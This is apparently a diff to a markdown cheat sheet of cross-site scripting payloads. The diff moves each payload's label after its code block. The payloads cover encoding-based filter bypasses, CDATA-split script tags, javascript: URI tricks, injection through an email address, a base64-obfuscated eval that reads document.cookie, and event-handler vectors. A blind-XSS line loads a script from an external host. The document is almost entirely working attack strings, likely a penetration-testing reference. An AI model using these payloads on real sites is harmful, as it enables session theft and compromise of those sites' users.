@@ -1,18 +1,18 @@
-Older ASP encoding filter bypass
-```%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E```
-Double URL encoded
-```%253Cscript%253Ealert(1)%253C%252Fscript%253E```
-XML Reflection XSS
-```<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>```
-Where :// is required after protocol
-```javascript://%250aalert(1)```
-XSS in email addresses
-```"\"><s>test"@gmail.com```
+```%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E```  Older ASP encoding filter bypass
+
+```%253Cscript%253Ealert(1)%253C%252Fscript%253E``` Older ASP encoding filter bypass
+
+```<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>``` XML Reflection XSS
+
+```javascript://%250aalert(1)```  Where :// is required after protocol
+
+```"\"><s>test"@gmail.com```  XSS in email addresses
   
 ```javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));```
 
-<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));</script>
-<imG/sRc=l oNerrOr=(prompt)() x>
+```<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));</script>```
+
+```<imG/sRc=l oNerrOr=(prompt)() x>```
 "><script src=https://a007.xss.ht></script>											Blind 
 <body onpageshow=alert(1)>
 <style onload=alert(1)>
